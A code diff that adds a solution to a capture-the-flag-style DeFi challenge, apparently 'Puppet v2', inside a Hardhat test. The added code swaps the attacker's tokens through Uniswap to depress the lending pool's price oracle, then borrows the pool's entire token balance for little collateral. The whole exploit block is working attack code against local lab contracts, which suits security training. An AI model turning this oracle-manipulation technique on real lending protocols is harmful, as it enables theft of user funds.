@@ -4,6 +4,7 @@ const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json")
 
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
+const web3 = require('web3');
 
 describe('[Challenge] Puppet v2', function () {
     let deployer, attacker;
@@ -13,6 +14,7 @@ describe('[Challenge] Puppet v2', function () {
     const UNISWAP_INITIAL_WETH_RESERVE = ethers.utils.parseEther('10');
 
     const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('10000');
+    const ATTACKER_ETH = ethers.utils.parseEther('19');
     const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000000');
 
     before(async function () {
@@ -82,6 +84,66 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const fromWei = (x) => web3.utils.fromWei(x);
+        const _curInfo = async (status) => {
+            console.log("\n" + status + "\n");
+            console.log("[+] Oracle Calc Deposit Required")
+            let _oracle = (await this.lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther("1")))
+            console.log("=> Oracle: " + fromWei(_oracle._hex) + "\n")
+            console.log("[+] Attacker ETH-DVT Pair Balance")
+            let attacker_eth = await ethers.provider.getBalance(attacker.address);
+            let attacker_dtv = await this.token.balanceOf(attacker.address);
+            let attacker_weth = await this.weth.balanceOf(attacker.address);
+
+            console.log("=> Attacker ETH : " + fromWei(attacker_eth._hex) + "\n");    // attacker ETH
+            console.log("=> Attacker DVT : " + fromWei(attacker_dtv._hex) + "\n");  // attacker DVT
+            console.log("=> Attacker WETH : " + fromWei(attacker_weth._hex) + "\n"); // attacker WETH
+            console.log("[+] LendingPool ETH-DVT Pair Balance");
+            let pool_eth = await ethers.provider.getBalance(this.lendingPool.address);
+            let pool_dtv = await this.token.balanceOf(this.lendingPool.address);
+            let pool_weth = await this.weth.balanceOf(this.lendingPool.address);
+            console.log("Lending Pool ETH : " + fromWei(pool_eth._hex) + "\n");    // lendingPool ETH
+            console.log("Lending Pool DVT : " + fromWei(pool_dtv._hex) + "\n");  // lendingPool DVT
+            console.log("Lending Pool WETH : " + fromWei(pool_weth._hex) + "\n");  // lendingPool WETH
+            console.log("[+] Uniswap Exchange ETH-DVT Pair Balance");
+            let exchange_eth = await ethers.provider.getBalance(this.uniswapExchange.address);
+            let exchange_dtv = await this.token.balanceOf(this.uniswapExchange.address);
+            let exchange_weth = await this.weth.balanceOf(this.uniswapExchange.address);
+
+            console.log("Uniswap Exchange ETH : " + fromWei(exchange_eth._hex) + "\n");    // exchange ETH
+            console.log("Uniswap Exchange DVT : " + fromWei(exchange_dtv._hex) + "\n");  // exchange DVT
+            console.log("Uniswap Exchange WETH : " + fromWei(exchange_weth._hex) + "\n");  // exchange WETH
+        }
+        /** CODE YOUR EXPLOIT HERE */
+        
+        _curInfo("Initial");
+
+    
+        await this.token.connect(attacker).approve(
+            this.uniswapRouter.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+
+
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
+            ATTACKER_INITIAL_TOKEN_BALANCE,                  // amountIn 
+            0,                                               // amountOutMin 
+            [this.token.address, this.uniswapRouter.WETH()], // path
+            attacker.address,                                // to
+            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
+        );
+
+        _curInfo("State");
+
+        const oraclePool = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Oracle Pool: " + fromWei(oraclePool._hex) + "\n");
+
+        await this.weth.connect(attacker).deposit({ value: oraclePool });
+        await this.weth.connect(attacker).approve(this.lendingPool.address, oraclePool);
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
+
+        _curInfo("Fini");
+        
     });
 
     after(async function () {
